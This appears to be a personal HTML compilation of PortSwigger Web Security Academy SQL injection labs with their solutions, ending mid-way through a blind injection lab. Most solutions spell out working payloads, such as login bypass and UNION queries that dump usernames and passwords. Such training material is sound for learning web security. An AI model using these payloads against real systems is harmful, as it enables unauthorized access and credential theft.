<!DOCTYPE html>
<html>

<head>
    <meta charset="utf-8">
    <meta content="IE=edge" http-equiv="X-UA-Compatible">
    <meta content="width=device-width, initial-scale=1" name="viewport">
    <title>ALL Labs by Ossama</title>
    <link rel="icon" href="/content/images/logos/favicon.ico" type="image/x-icon" />
    <link href="/content/pswebsecacademy.css" rel="stylesheet" type="text/css">
    <style>
        hr {
            color: orange;
            /* Color of the line */
            background-color: orange;
            /* Background color behind the line */
            height: 10px;
            /* Height of the line */
            margin: 10px 10px;
            /* Margin above and below the line */
            border: none;
            /* Remove the default border */
        }

        .code-scrollable {
            width: 900px;
            /* Set the fixed width for the code block */
            white-space: nowrap;
            /* Prevent text from wrapping to the next line */
            overflow-x: auto;
            /* Enable horizontal scrolling if content overflows */
            border: 1px solid #ccc;
            /* Optional: Add a border for clarity */
            padding: 10px;
            /* Optional: Add padding for spacing */
        }
    </style>
</head>

<body class="theme-">
    <div class="wrapper-large">
        <h3>
            Red: Couldn't exploit without reading the solution.<br>
            Purple: Not Detected by Burp Scanner & MeðŸ‘€.<br>
            Green: Solved without reading the solution.<br>
        </h3>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
                (sql-injection)</h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-green-small">
                        APPRENTICE
                    </span>
                </p>
            </div>
            <p>
                This lab contains a
                <a href="https://portswigger.net/web-security/sql-injection">
                    SQL injection
                </a>
                vulnerability in the product category filter. When the user selects a category, the application carries
                out a SQL query like the following:
            </p>
            <code class="code-scrollable">
  SELECT * FROM products WHERE category = 'Gifts' AND released = 1
 </code>
            <p>
                To solve the lab, perform a SQL injection attack that causes the application to display one or more
                unreleased products.
            </p>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/d9a071d8264e85184722707ff5747bbbd77963967d1d01f1b22f5dd8252f9767?referrer=%2fweb-security%2fsql-injection%2flab-retrieve-hidden-data"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    Use Burp Suite to intercept and modify the request that sets the product category
                                    filter.
                                </li>
                                <li>
                                    Modify the
                                    <code>
        category
       </code>
                                    parameter, giving it the value
                                    <code>
        '+OR+1=1--
       </code>
                                </li>
                                <li>
                                    Submit the request, and verify that the response now contains one or more unreleased
                                    products.
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: SQL injection vulnerability allowing login bypass
                (sql-injection)</h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-green-small">
                        APPRENTICE
                    </span>
                </p>
            </div>
            <p>
                This lab contains a
                <a href="https://portswigger.net/web-security/sql-injection">
                    SQL injection
                </a>
                vulnerability in the login function.
            </p>
            <p>
                To solve the lab, perform a SQL injection attack that logs in to the application as the
                <code>
   administrator
  </code>
                user.
            </p>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/befc0f5ddbc0e32a7adc4c9d4d286582f462f70bf32a8d5df15489d679dcd5c9?referrer=%2fweb-security%2fsql-injection%2flab-login-bypass"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    Use Burp Suite to intercept and modify the login request.
                                </li>
                                <li>
                                    Modify the
                                    <code>
        username
       </code>
                                    parameter, giving it the value:
                                    <code>
        administrator'--
       </code>
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: SQL injection attack, querying the database type and version on Oracle
                (sql-injection)</h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab contains a
                <a href="https://portswigger.net/web-security/sql-injection">
                    SQL injection
                </a>
                vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an
                injected query.
            </p>
            <p>
                To solve the lab, display the database version string.
            </p>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-erlenmeyer">
                            </span>
                            Hint
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <p>
                                On Oracle databases, every
                                <code>
       SELECT
      </code>
                                statement must specify a table to select
                                <code>
       FROM
      </code>
                                . If your
                                <code>
       UNION SELECT
      </code>
                                attack does not query from a table, you will still need to include the
                                <code>
       FROM
      </code>
                                keyword followed by a valid table name.
                            </p>
                            <p>
                                There is a built-in table on Oracle called
                                <code>
       dual
      </code>
                                which you can use for this purpose. For example:
                                <code>
       UNION SELECT 'abc' FROM dual
      </code>
                            </p>
                            <p>
                                For more information, see our
                                <a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">
                                    SQL injection cheat sheet
                                </a>
                                .
                            </p>
                        </div>
                    </div>
                </details>
            </div>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/974bd9df06352f8b59c679f854a5bc7e3db6c7fb83f72db653509252a6d47e28?referrer=%2fweb-security%2fsql-injection%2fexamining-the-database%2flab-querying-database-version-oracle"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    Use Burp Suite to intercept and modify the request that sets the product category
                                    filter.
                                </li>
                                <li>
                                    <p>
                                        Determine the
                                        <a
                                            href="https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns">
                                            number of columns that are being returned by the query
                                        </a>
                                        and
                                        <a
                                            href="https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text">
                                            which columns contain text data
                                        </a>
                                        . Verify that the query is returning two columns, both of which contain text,
                                        using a payload like the following in the
                                        <code>
         category
        </code>
                                        parameter:
                                    </p>
                                    <code class="code-scrollable">
        '+UNION+SELECT+'abc','def'+FROM+dual--
       </code>
                                </li>
                                <li>
                                    <p>
                                        Use the following payload to display the database version:
                                    </p>
                                    <code class="code-scrollable">
        '+UNION+SELECT+BANNER,+NULL+FROM+v$version--
       </code>
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft
                (sql-injection)</h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab contains a
                <a href="https://portswigger.net/web-security/sql-injection">
                    SQL injection
                </a>
                vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an
                injected query.
            </p>
            <p>
                To solve the lab, display the database version string.
            </p>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-erlenmeyer">
                            </span>
                            Hint
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <p>
                                You can find some useful payloads on our
                                <a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">
                                    SQL injection cheat sheet
                                </a>
                                .
                            </p>
                        </div>
                    </div>
                </details>
            </div>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/13e48d1949abb8793e11da34ed06a5811ea3a9b2be0501a5e9f0deb255d37406?referrer=%2fweb-security%2fsql-injection%2fexamining-the-database%2flab-querying-database-version-mysql-microsoft"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    Use Burp Suite to intercept and modify the request that sets the product category
                                    filter.
                                </li>
                                <li>
                                    <p>
                                        Determine the
                                        <a
                                            href="https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns">
                                            number of columns that are being returned by the query
                                        </a>
                                        and
                                        <a
                                            href="https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text">
                                            which columns contain text data
                                        </a>
                                        . Verify that the query is returning two columns, both of which contain text,
                                        using a payload like the following in the
                                        <code>
         category
        </code>
                                        parameter:
                                    </p>
                                    <code class="code-scrollable">
        '+UNION+SELECT+'abc','def'#
       </code>
                                </li>
                                <li>
                                    <p>
                                        Use the following payload to display the database version:
                                    </p>
                                    <code class="code-scrollable">
        '+UNION+SELECT+@@version,+NULL#
       </code>
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: SQL injection attack, listing the database contents on non-Oracle databases
                (sql-injection)</h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab contains a
                <a href="https://portswigger.net/web-security/sql-injection">
                    SQL injection
                </a>
                vulnerability in the product category filter. The results from the query are returned in the
                application's response so you can use a UNION attack to retrieve data from other tables.
            </p>
            <p>
                The application has a login function, and the database contains a table that holds usernames and
                passwords. You need to determine the name of this table and the columns it contains, then retrieve the
                contents of the table to obtain the username and password of all users.
            </p>
            <p>
                To solve the lab, log in as the
                <code>
   administrator
  </code>
                user.
            </p>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-erlenmeyer">
                            </span>
                            Hint
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <p>
                                You can find some useful payloads on our
                                <a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">
                                    SQL injection cheat sheet
                                </a>
                                .
                            </p>
                        </div>
                    </div>
                </details>
            </div>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/81986add1fa6ec438867539cc2f562f01dcf9faf6a0b82766269c3dbeef30b00?referrer=%2fweb-security%2fsql-injection%2fexamining-the-database%2flab-listing-database-contents-non-oracle"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    Use Burp Suite to intercept and modify the request that sets the product category
                                    filter.
                                </li>
                                <li>
                                    <p>
                                        Determine the
                                        <a
                                            href="https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns">
                                            number of columns that are being returned by the query
                                        </a>
                                        and
                                        <a
                                            href="https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text">
                                            which columns contain text data
                                        </a>
                                        . Verify that the query is returning two columns, both of which contain text,
                                        using a payload like the following in the
                                        <code>
         category
        </code>
                                        parameter:
                                    </p>
                                    <code class="code-scrollable">
        '+UNION+SELECT+'abc','def'--
       </code>
                                </li>
                                <li>
                                    <p>
                                        Use the following payload to retrieve the list of tables in the database:
                                    </p>
                                    <code class="code-scrollable">
        '+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
       </code>
                                </li>
                                <li>
                                    Find the name of the table containing user credentials.
                                </li>
                                <li>
                                    <p>
                                        Use the following payload (replacing the table name) to retrieve the details of
                                        the columns in the table:
                                    </p>
                                    <code class="code-scrollable">
        '+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--
       </code>
                                </li>
                                <li>
                                    Find the names of the columns containing usernames and passwords.
                                </li>
                                <li>
                                    <p>
                                        Use the following payload (replacing the table and column names) to retrieve the
                                        usernames and passwords for all users:
                                    </p>
                                    <code class="code-scrollable">
        '+UNION+SELECT+username_abcdef,+password_abcdef+FROM+users_abcdef--
       </code>
                                </li>
                                <li>
                                    Find the password for the
                                    <code>
        administrator
       </code>
                                    user, and use it to log in.
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: SQL injection attack, listing the database contents on Oracle
                (sql-injection)</h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab contains a
                <a href="https://portswigger.net/web-security/sql-injection">
                    SQL injection
                </a>
                vulnerability in the product category filter. The results from the query are returned in the
                application's response so you can use a UNION attack to retrieve data from other tables.
            </p>
            <p>
                The application has a login function, and the database contains a table that holds usernames and
                passwords. You need to determine the name of this table and the columns it contains, then retrieve the
                contents of the table to obtain the username and password of all users.
            </p>
            <p>
                To solve the lab, log in as the
                <code>
   administrator
  </code>
                user.
            </p>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-erlenmeyer">
                            </span>
                            Hint
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <p>
                                On Oracle databases, every
                                <code>
       SELECT
      </code>
                                statement must specify a table to select
                                <code>
       FROM
      </code>
                                . If your
                                <code>
       UNION SELECT
      </code>
                                attack does not query from a table, you will still need to include the
                                <code>
       FROM
      </code>
                                keyword followed by a valid table name.
                            </p>
                            <p>
                                There is a built-in table on Oracle called
                                <code>
       dual
      </code>
                                which you can use for this purpose. For example:
                                <code>
       UNION SELECT 'abc' FROM dual
      </code>
                            </p>
                            <p>
                                For more information, see our
                                <a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">
                                    SQL injection cheat sheet
                                </a>
                                .
                            </p>
                        </div>
                    </div>
                </details>
            </div>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/de4256d42cc604a2a3f7e792c5fff88df1712f1537cd506ed2537efedbd4c665?referrer=%2fweb-security%2fsql-injection%2fexamining-the-database%2flab-listing-database-contents-oracle"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    Use Burp Suite to intercept and modify the request that sets the product category
                                    filter.
                                </li>
                                <li>
                                    <p>
                                        Determine the
                                        <a
                                            href="https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns">
                                            number of columns that are being returned by the query
                                        </a>
                                        and
                                        <a
                                            href="https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text">
                                            which columns contain text data
                                        </a>
                                        . Verify that the query is returning two columns, both of which contain text,
                                        using a payload like the following in the
                                        <code>
         category
        </code>
                                        parameter:
                                    </p>
                                    <code class="code-scrollable">
        '+UNION+SELECT+'abc','def'+FROM+dual--
       </code>
                                </li>
                                <li>
                                    <p>
                                        Use the following payload to retrieve the list of tables in the database:
                                    </p>
                                    <code class="code-scrollable">
        '+UNION+SELECT+table_name,NULL+FROM+all_tables--
       </code>
                                </li>
                                <li>
                                    Find the name of the table containing user credentials.
                                </li>
                                <li>
                                    <p>
                                        Use the following payload (replacing the table name) to retrieve the details of
                                        the columns in the table:
                                    </p>
                                    <code class="code-scrollable">
        '+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_ABCDEF'--
       </code>
                                </li>
                                <li>
                                    Find the names of the columns containing usernames and passwords.
                                </li>
                                <li>
                                    <p>
                                        Use the following payload (replacing the table and column names) to retrieve the
                                        usernames and passwords for all users:
                                    </p>
                                    <code class="code-scrollable">
        '+UNION+SELECT+USERNAME_ABCDEF,+PASSWORD_ABCDEF+FROM+USERS_ABCDEF--
       </code>
                                </li>
                                <li>
                                    Find the password for the
                                    <code>
        administrator
       </code>
                                    user, and use it to log in.
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab:
                <a href="https://portswigger.net/web-security/sql-injection/union-attacks">
                    SQL injection UNION
                </a>
                attack, determining the number of columns returned by the query
                (sql-injection)
            </h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab contains a SQL injection vulnerability in the product category filter. The results from the
                query are returned in the application's response, so you can use a UNION attack to retrieve data from
                other tables. The first step of such an attack is to determine the number of columns that are being
                returned by the query. You will then use this technique in subsequent labs to construct the full attack.
            </p>
            <p>
                To solve the lab, determine the number of columns returned by the query by performing a
                <a href="https://portswigger.net/web-security/sql-injection/union-attacks">
                    SQL injection UNION
                </a>
                attack that returns an additional row containing null values.
            </p>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/c0cf223d86b3189ea471d7a4dfe43987f9306dcd549be77599964da1b517b307?referrer=%2fweb-security%2fsql-injection%2funion-attacks%2flab-determine-number-of-columns"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    Use Burp Suite to intercept and modify the request that sets the product category
                                    filter.
                                </li>
                                <li>
                                    Modify the
                                    <code>
        category
       </code>
                                    parameter, giving it the value
                                    <code>
        '+UNION+SELECT+NULL--
       </code>
                                    . Observe that an error occurs.
                                </li>
                                <li>
                                    <p>
                                        Modify the
                                        <code>
         category
        </code>
                                        parameter to add an additional column containing a null value:
                                    </p>
                                    <code class="code-scrollable">
        '+UNION+SELECT+NULL,NULL--
       </code>
                                </li>
                                <li>
                                    Continue adding null values until the error disappears and the response includes
                                    additional content containing the null values.
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab:
                <a href="https://portswigger.net/web-security/sql-injection/union-attacks">
                    SQL injection UNION
                </a>
                attack, finding a column containing text
                (sql-injection)
            </h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab contains a SQL injection vulnerability in the product category filter. The results from the
                query are returned in the application's response, so you can use a UNION attack to retrieve data from
                other tables. To construct such an attack, you first need to determine the number of columns returned by
                the query. You can do this using a technique you learned in a
                <a
                    href="https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns">
                    previous lab
                </a>
                . The next step is to identify a column that is compatible with string data.
            </p>
            <p>
                The lab will provide a random value that you need to make appear within the query results. To solve the
                lab, perform a
                <a href="https://portswigger.net/web-security/sql-injection/union-attacks">
                    SQL injection UNION
                </a>
                attack that returns an additional row containing the value provided. This technique helps you determine
                which columns are compatible with string data.
            </p>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/dc3ff4b519f1a96f0bd7507a607ced9ca7f87900eb196d0a9b25001de1833f5e?referrer=%2fweb-security%2fsql-injection%2funion-attacks%2flab-find-column-containing-text"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    Use Burp Suite to intercept and modify the request that sets the product category
                                    filter.
                                </li>
                                <li>
                                    <p>
                                        Determine the
                                        <a
                                            href="https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns">
                                            number of columns that are being returned by the query
                                        </a>
                                        . Verify that the query is returning three columns, using the following payload
                                        in the
                                        <code>
         category
        </code>
                                        parameter:
                                    </p>
                                    <code class="code-scrollable">
        '+UNION+SELECT+NULL,NULL,NULL--
       </code>
                                </li>
                                <li>
                                    <p>
                                        Try replacing each null with the random value provided by the lab, for example:
                                    </p>
                                    <code class="code-scrollable">
        '+UNION+SELECT+'abcdef',NULL,NULL--
       </code>
                                </li>
                                <li>
                                    If an error occurs, move on to the next null and try that instead.
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab:
                <a href="https://portswigger.net/web-security/sql-injection/union-attacks">
                    SQL injection UNION
                </a>
                attack, retrieving data from other tables
                (sql-injection)
            </h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab contains a SQL injection vulnerability in the product category filter. The results from the
                query are returned in the application's response, so you can use a UNION attack to retrieve data from
                other tables. To construct such an attack, you need to combine some of the techniques you learned in
                previous labs.
            </p>
            <p>
                The database contains a different table called
                <code>
   users
  </code>
                , with columns called
                <code>
   username
  </code>
                and
                <code>
   password
  </code>
                .
            </p>
            <p>
                To solve the lab, perform a
                <a href="https://portswigger.net/web-security/sql-injection/union-attacks">
                    SQL injection UNION
                </a>
                attack that retrieves all usernames and passwords, and use the information to log in as the
                <code>
   administrator
  </code>
                user.
            </p>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/c94c990a42d1b1f39e53806b1d0d1ad51a43e1f2d5ec1a602c144d7817d3e91c?referrer=%2fweb-security%2fsql-injection%2funion-attacks%2flab-retrieve-data-from-other-tables"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    Use Burp Suite to intercept and modify the request that sets the product category
                                    filter.
                                </li>
                                <li>
                                    <p>
                                        Determine the
                                        <a
                                            href="https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns">
                                            number of columns that are being returned by the query
                                        </a>
                                        and
                                        <a
                                            href="https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text">
                                            which columns contain text data
                                        </a>
                                        . Verify that the query is returning two columns, both of which contain text,
                                        using a payload like the following in the category parameter:
                                    </p>
                                    <code class="code-scrollable">
        '+UNION+SELECT+'abc','def'--
       </code>
                                </li>
                                <li>
                                    <p>
                                        Use the following payload to retrieve the contents of the
                                        <code>
         users
        </code>
                                        table:
                                    </p>
                                    <code class="code-scrollable">
        '+UNION+SELECT+username,+password+FROM+users--
       </code>
                                </li>
                                <li>
                                    Verify that the application's response contains usernames and passwords.
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab:
                <a href="https://portswigger.net/web-security/sql-injection/union-attacks">
                    SQL injection UNION
                </a>
                attack, retrieving multiple values in a single column
                (sql-injection)
            </h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab contains a SQL injection vulnerability in the product category filter. The results from the
                query are returned in the application's response so you can use a UNION attack to retrieve data from
                other tables.
            </p>
            <p>
                The database contains a different table called
                <code>
   users
  </code>
                , with columns called
                <code>
   username
  </code>
                and
                <code>
   password
  </code>
                .
            </p>
            <p>
                To solve the lab, perform a
                <a href="https://portswigger.net/web-security/sql-injection/union-attacks">
                    SQL injection UNION
                </a>
                attack that retrieves all usernames and passwords, and use the information to log in as the
                <code>
   administrator
  </code>
                user.
            </p>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-erlenmeyer">
                            </span>
                            Hint
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <p>
                                You can find some useful payloads on our
                                <a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">
                                    SQL injection cheat sheet
                                </a>
                                .
                            </p>
                        </div>
                    </div>
                </details>
            </div>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/7c96fa50c7c53c9f9c96467a8b9e76f070dafcf9bfdcc4f04fc786ef0b0819d2?referrer=%2fweb-security%2fsql-injection%2funion-attacks%2flab-retrieve-multiple-values-in-single-column"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    Use Burp Suite to intercept and modify the request that sets the product category
                                    filter.
                                </li>
                                <li>
                                    <p>
                                        Determine the
                                        <a
                                            href="https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns">
                                            number of columns that are being returned by the query
                                        </a>
                                        and
                                        <a
                                            href="https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text">
                                            which columns contain text data
                                        </a>
                                        . Verify that the query is returning two columns, only one of which contain
                                        text, using a payload like the following in the
                                        <code>
         category
        </code>
                                        parameter:
                                    </p>
                                    <code class="code-scrollable">
        '+UNION+SELECT+NULL,'abc'--
       </code>
                                </li>
                                <li>
                                    <p>
                                        Use the following payload to retrieve the contents of the
                                        <code>
         users
        </code>
                                        table:
                                    </p>
                                    <code class="code-scrollable">
        '+UNION+SELECT+NULL,username||'~'||password+FROM+users--
       </code>
                                </li>
                                <li>
                                    Verify that the application's response contains usernames and passwords.
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: Blind
                <a href="https://portswigger.net/web-security/sql-injection">
                    SQL injection
                </a>
                with conditional responses
                (sql-injection)
            </h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab contains a
                <a href="https://portswigger.net/web-security/sql-injection/blind">
                    blind SQL injection
                </a>
                vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing
                the value of the submitted cookie.
            </p>
            <p>
                The results of the SQL query are not returned, and no error messages are displayed. But the application
                includes a "Welcome back" message in the page if the query returns any rows.
            </p>
            <p>
                The database contains a different table called
                <code>
   users
  </code>
                , with columns called
                <code>
   username
  </code>
                and
                <code>
   password
  </code>
                . You need to exploit the blind SQL injection vulnerability to find out the password of the
                <code>
   administrator
  </code>
                user.
            </p>
            <p>
                To solve the lab, log in as the
                <code>
   administrator
  </code>
                user.
            </p>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-erlenmeyer">
                            </span>
                            Hint
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <p>
                                You can assume that the password only contains lowercase, alphanumeric characters.
                            </p>
                        </div>
                    </div>
                </details>
            </div>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/5aeeac77d52d55cdff3f9a5d86d050c9a77ebfef7657cccb459bee29ad5c3fce?referrer=%2fweb-security%2fsql-injection%2fblind%2flab-conditional-responses"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    Visit the front page of the shop, and use Burp Suite to intercept and modify the
                                    request containing the
                                    <code>
        TrackingId
       </code>
                                    cookie. For simplicity, let's say the original value of the cookie is
                                    <code>
